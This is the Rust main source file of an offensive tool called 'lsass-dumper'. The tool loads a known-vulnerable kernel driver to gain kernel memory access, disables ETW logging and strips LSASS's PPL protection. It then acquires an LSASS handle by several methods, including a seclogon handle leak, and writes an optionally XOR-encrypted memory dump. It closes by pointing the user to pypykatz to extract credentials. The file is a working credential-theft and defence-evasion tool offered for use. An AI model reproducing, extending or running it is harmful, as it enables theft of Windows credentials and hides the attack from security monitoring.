#![allow(dead_code)]
#![allow(unused_imports)]

mod crypto;
mod driver;
mod dumper;

mod etw;
mod handle;
mod kernel_rw;
mod minidump;
mod offsets;
mod ppl;
mod resolver;
mod seclogon;
mod sfdrv64;
mod syscall;

use clap::{Parser, ValueEnum};
use std::process;

#[derive(Clone, ValueEnum)]
enum HandleMethod {
    /// Direct NtOpenProcess with PROCESS_VM_READ
    Direct,
    /// Fork (clone) the LSASS process, dump the clone
    Fork,
    /// Duplicate existing LSASS handle from another process
    Dup,
    /// Seclogon handle leak via PID spoofing + CreateProcessWithLogonW
    Seclogon,
}

#[derive(Clone, ValueEnum, PartialEq)]
enum DriverType {
    /// viragt64.sys — virtual memory IOCTL (direct R/W)
    Viragt,
    /// sfdrvx64.sys — SpeedFan physical memory DM_KernelSyscall
    #[value(name = "sfdrv")]
    Sfdrv,
}

#[derive(Parser)]
#[command(name = "lsass-dumper")]
#[command(about = "BYOVD LSASS dumper - Bypass PPL + dump via NTAPI syscalls")]
struct Cli {
    /// Path to vulnerable driver file
    #[arg(short, long, default_value = "viragt64.sys")]
    driver: String,

    /// Output dump file path
    #[arg(short, long, default_value = "lsass.dmp")]
    output: String,

    /// Service name for the driver
    #[arg(short, long, default_value = "viragt64")]
    service_name: String,

    /// Driver type: viragt (virtual memory) or eneio (DM_KernelSyscall)
    #[arg(short = 't', long, value_enum, default_value_t = DriverType::Viragt)]
    driver_type: DriverType,

    /// LSASS handle acquisition method (viragt mode only)
    #[arg(short, long, value_enum, default_value_t = HandleMethod::Seclogon)]
    method: HandleMethod,

    /// XOR encrypt the dump file
    #[arg(long, default_value_t = false)]
    encrypt: bool,

    /// Skip restoring PPL protection after dump (debug mode)
    #[arg(long, default_value_t = false)]
    no_restore: bool,

    /// Skip driver unload (viragt64.sys BSODs on service stop)
    #[arg(long, default_value_t = true)]
    no_unload: bool,
}

fn main() {
    let cli = Cli::parse();

    let backend_name = match cli.driver_type {
        DriverType::Viragt => "viragt64 (virtual memory IOCTL)",
        DriverType::Sfdrv => "sfdrvx64 (DM_KernelSyscall SpeedFan)",
    };

    println!("[*] BYOVD LSASS Dumper v2");
    println!("[*] Driver: {} ({})", cli.driver, backend_name);
    println!("[*] Output: {}", cli.output);

    // ─── Common init ──────────────────────────────────────────────────

    println!("\n[*] Step 0: Initializing dynamic API resolver...");
    let api = match resolver::ApiResolver::init() {
        Ok(a) => {
            println!("[+] API resolver initialized via PEB walk");
            a
        }
        Err(e) => {
            eprintln!("[-] Failed to initialize API resolver: {}", e);
            process::exit(1);
        }
    };

    if !is_elevated(&api) {
        eprintln!("[-] This tool requires administrator privileges. Run as Administrator.");
        process::exit(1);
    }
    println!("[+] Running with administrator privileges");

    if !enable_se_debug_privilege() {
        eprintln!("[-] Failed to enable SeDebugPrivilege");
        process::exit(1);
    }
    println!("[+] SeDebugPrivilege enabled");

    let driver_abs_str = resolve_driver_path(&cli.driver);

    // Find LSASS PID
    let lsass_pid = match handle::find_lsass_pid() {
        Some(pid) => {
            println!("[+] Found lsass.exe PID: {}", pid);
            pid
        }
        None => {
            eprintln!("[-] Failed to find lsass.exe process");
            process::exit(1);
        }
    };

    // Load driver
    println!("\n[*] Step 1: Loading vulnerable driver...");
    let driver_guard = match driver::load_driver(&api, &cli.service_name, &driver_abs_str) {
        Ok(guard) => {
            println!("[+] Driver loaded as service '{}'", cli.service_name);
            guard
        }
        Err(e) => {
            eprintln!("[-] Failed to load driver: {}", e);
            process::exit(1);
        }
    };

    // ─── Branch based on driver type ──────────────────────────────────

    let dump_result = match cli.driver_type {
        DriverType::Viragt => run_viragt_flow(&cli, &api, lsass_pid, &driver_guard),
        DriverType::Sfdrv => run_sfdrv_flow(&cli, &api, lsass_pid),
    };

    // ─── Cleanup ──────────────────────────────────────────────────────

    println!("[*] Cleaning up...");
    if cli.no_unload {
        println!("[!] Skipping driver unload");
        std::mem::forget(driver_guard);
    } else {
        drop(driver_guard);
        println!("[+] Driver unloaded and service deleted");
    }

    match dump_result {
        Ok(size) => {
            println!(
                "\n[+] SUCCESS! LSASS dump: {} ({:.2} MB)",
                cli.output,
                size as f64 / 1048576.0
            );
            if cli.encrypt {
                println!("[+] Dump is XOR encrypted. Decrypt before use.");
            }
            println!("[*] Use pypykatz to extract credentials:");
            println!("    pypykatz lsa minidump {}", cli.output);
        }
        Err(e) => {
            eprintln!("\n[-] LSASS dump failed: {}", e);
            process::exit(1);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// viragt64 flow: PPL bypass via EPROCESS + ETW patch + user-mode handle/dump
// ═══════════════════════════════════════════════════════════════════════════════

fn run_viragt_flow(
    cli: &Cli,
    api: &resolver::ApiResolver,
    lsass_pid: u32,
    _driver_guard: &driver::DriverGuard,
) -> Result<u64, String> {
    println!(
        "[*] Method: {}",
        match cli.method {
            HandleMethod::Direct => "direct (NtOpenProcess)",
            HandleMethod::Fork => "fork (process clone)",
            HandleMethod::Dup => "dup (handle duplication)",
            HandleMethod::Seclogon => "seclogon (handle leak)",
        }
    );

    let os_offsets = match offsets::detect_offsets() {
        Some(o) => {
            println!("[+] Detected Windows build: {}", o.build_number);
            o
        }
        None => return Err("Unsupported Windows version".to_string()),
    };

    // Step 2: Open kernel R/W channel
    println!("[*] Step 2: Opening kernel R/W channel (viragt64)...");
    let krw = kernel_rw::ViragKernelRW::new(api)
        .map_err(|e| format!("Failed to open viragt64 R/W: {}", e))?;
    println!("[+] Kernel R/W channel opened");

    // Step 3: Disable ETW
    println!("[*] Step 3: Disabling user-mode ETW...");
    let etw_state = match etw::disable_etw(api) {
        Ok(state) => {
            println!("[+] ETW disabled");
            state
        }
        Err(e) => {
            eprintln!("[!] Warning: ETW bypass failed: {} (continuing)", e);
            etw::EtwState {
                etw_address: std::ptr::null_mut(),
                original_byte: 0,
                patched: false,
            }
        }
    };

    // Step 4: Bypass PPL
    println!("[*] Step 4: Bypassing PPL protection...");
    let ppl_state = ppl::bypass_ppl(&krw, &os_offsets, lsass_pid)
        .map_err(|e| format!("PPL bypass failed: {}", e))?;
    println!(
        "[+] PPL bypass successful! Original: 0x{:02X}",
        ppl_state.original_protection
    );

    // Step 5: Acquire LSASS handle
    println!("[*] Step 5: Acquiring LSASS handle...");
    let lsass_handle = match &cli.method {
        HandleMethod::Direct => handle::open_lsass_direct(lsass_pid),
        HandleMethod::Fork => handle::open_lsass_fork(lsass_pid),
        HandleMethod::Dup => handle::open_lsass_dup(lsass_pid),
        HandleMethod::Seclogon => seclogon::open_lsass_seclogon(api, lsass_pid),
    }
    .map_err(|e| {
        let _ = ppl::restore_ppl(&krw, &os_offsets, &ppl_state);
        format!("Failed to acquire LSASS handle: {}", e)
    })?;
    println!("[+] LSASS handle acquired");

    // Step 6: Build minidump
    println!("[*] Step 6: Building minidump via NtReadVirtualMemory...");
    let dump_result = minidump::create_minidump(
        api,
        lsass_handle.handle(),
        lsass_pid,
        &cli.output,
        cli.encrypt,
    );

    // Step 7: Restore PPL and ETW
    if !cli.no_restore {
        println!("[*] Step 7: Restoring PPL and ETW...");
        match ppl::restore_ppl(&krw, &os_offsets, &ppl_state) {
            Ok(_) => println!(
                "[+] PPL restored to 0x{:02X}",
                ppl_state.original_protection
            ),
            Err(e) => eprintln!("[!] Warning: Failed to restore PPL: {}", e),
        }
        match etw::restore_etw(&etw_state) {
            Ok(_) => {
                if etw_state.patched {
                    println!("[+] ETW restored");
                }
            }
            Err(e) => eprintln!("[!] Warning: Failed to restore ETW: {}", e),
        }
    }

    drop(lsass_handle);
    drop(krw);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// sfdrvx64 flow: DM_KernelSyscall via SpeedFan sfdrvx64.sys
// ═══════════════════════════════════════════════════════════════════════════════

fn run_sfdrv_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
    println!("[*] DM_KernelSyscall mode (sfdrvx64 — SpeedFan)");
    println!("[*] All memory operations will execute in kernel mode\n");

    println!("[*] Step 2: Initializing sfdrvx64 DM_KernelSyscall engine...");
    let engine = sfdrv64::DmEngine::new(api)
        .map_err(|e| format!("Failed to initialize sfdrvx64 engine: {}", e))?;
    println!("[+] sfdrvx64 DM_KernelSyscall engine ready");

    println!("[*] Step 3: Opening LSASS via kernel ZwOpenProcess (PPL bypass)...");
    let lsass_handle = engine
        .open_process(lsass_pid)
        .map_err(|e| format!("Kernel ZwOpenProcess failed: {}", e))?;
    println!("[+] LSASS handle acquired via kernel: {:?}", lsass_handle);

    println!("[*] Step 4: Building minidump via NtReadVirtualMemory...");
    let dump_result =
        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);

    unsafe {
        let fn_close: unsafe extern "system" fn(
            windows::Win32::Foundation::HANDLE,
        ) -> windows::Win32::Foundation::BOOL =
            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
        let _ = fn_close(lsass_handle);
    }

    drop(engine);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// Utility functions
// ═══════════════════════════════════════════════════════════════════════════════

fn is_elevated(_api: &resolver::ApiResolver) -> bool {
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            return false;
        }
        let mut elevation = TOKEN_ELEVATION::default();
        let mut ret_len = 0u32;
        let result = GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len,
        );
        let _ = CloseHandle(token);
        result.is_ok() && elevation.TokenIsElevated != 0
    }
}

fn resolve_driver_path(cli_driver: &str) -> String {
    let driver_path = std::path::Path::new(cli_driver);
    if !driver_path.exists() {
        eprintln!("[-] Driver file not found: {}", cli_driver);
        eprintln!("    Place {} in the current directory", cli_driver);
        process::exit(1);
    }
    let abs = std::fs::canonicalize(cli_driver)
        .unwrap_or_else(|e| {
            eprintln!("[-] Failed to resolve driver path: {}", e);
            process::exit(1);
        })
        .to_string_lossy()
        .to_string();
    abs.strip_prefix("\\\\?\\").unwrap_or(&abs).to_string()
}

fn enable_se_debug_privilege() -> bool {
    use windows::core::w;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        )
        .is_err()
        {
            return false;
        }

        let mut luid = LUID::default();
        if LookupPrivilegeValueW(None, w!("SeDebugPrivilege"), &mut luid).is_err() {
            let _ = CloseHandle(token);
            return false;
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        let result = AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None);

        let _ = CloseHandle(token);
        result.is_ok()
    }
}
